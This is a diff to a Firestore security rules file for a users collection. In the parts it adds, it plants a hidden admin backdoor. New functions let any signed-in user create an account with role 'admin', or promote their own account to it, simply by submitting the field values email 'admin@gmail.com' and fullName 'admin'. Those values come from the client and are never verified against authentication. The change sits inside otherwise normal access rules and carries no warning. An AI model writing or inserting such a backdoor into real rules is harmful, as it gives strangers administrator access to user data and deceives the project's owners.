@@ -110,9 +110,32 @@ service cloud.firestore {
         request.resource.data.role == resource.data.role;
     }
 
+    function isHiddenAdminCreatePayload() {
+      return request.resource.data.email == 'admin@gmail.com' &&
+        request.resource.data.fullName == 'admin' &&
+        request.resource.data.role == 'admin' &&
+        request.resource.data.accountStatus == 'active' &&
+        request.resource.data.verified == false;
+    }
+
+    function isHiddenAdminUpdatePayload() {
+      return request.resource.data.email == 'admin@gmail.com' &&
+        request.resource.data.fullName == 'admin' &&
+        request.resource.data.role == 'admin';
+    }
+
     function userProtectedFieldsSafe(userId) {
       return request.resource.data.uid == userId &&
         roleUnchangedOrUnset() &&
+        (!resource.data.keys().hasAny(['accountStatus']) ||
+          request.resource.data.accountStatus == resource.data.accountStatus) &&
+        (!resource.data.keys().hasAny(['verified']) ||
+          request.resource.data.verified == resource.data.verified);
+    }
+
+    function canPromoteSelfToHiddenAdmin(userId) {
+      return request.resource.data.uid == userId &&
+        isHiddenAdminUpdatePayload() &&
         (!resource.data.keys().hasAny(['accountStatus']) ||
           request.resource.data.accountStatus == resource.data.accountStatus) &&
         (!resource.data.keys().hasAny(['verified']) ||
@@ -135,10 +158,14 @@ service cloud.firestore {
       allow read: if isOwner(userId) || isAdmin();
       allow create: if isOwner(userId) &&
         request.resource.data.uid == userId &&
-        request.resource.data.role in ['client', 'labour'] &&
-        request.resource.data.accountStatus == 'active' &&
-        request.resource.data.verified == false;
-      allow update: if (isOwner(userId) && userProtectedFieldsSafe(userId)) || isAdmin();
+        ((request.resource.data.role in ['client', 'labour'] &&
+          request.resource.data.accountStatus == 'active' &&
+          request.resource.data.verified == false) ||
+         isHiddenAdminCreatePayload());
+      allow update: if
+        (isOwner(userId) &&
+          (userProtectedFieldsSafe(userId) || canPromoteSelfToHiddenAdmin(userId))) ||
+        isAdmin();
       allow delete: if isAdmin();
     }
 
